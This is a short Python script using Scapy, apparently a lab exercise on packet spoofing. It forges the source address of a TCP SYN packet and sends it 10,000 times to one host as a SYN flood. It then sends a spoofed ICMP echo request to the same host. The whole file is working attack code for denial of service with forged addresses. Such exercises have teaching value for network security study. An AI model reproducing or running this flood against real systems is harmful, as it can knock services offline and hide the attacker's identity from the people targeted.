"""
Task: Spoofing Packets using Scapy
"""
# Creating a TCP Packet for SYN-Flooding
tcp_packet = IP(src="192.168.24.171", dst="192.168.24.172")/TCP(sport=56899, dport=59000, flags='S', seq=0, ack=0)

# Sending the TCP Packet
send(tcp_packet, count=10000)

# Creating a ICMP Packet to initiate a fake ping connection
icmp_packet = IP (src="192.168.24.170", dst="192.168.24.172")/ICMP(type=8, code=0)

# Sending the ICMP packet
send(icmp_packet)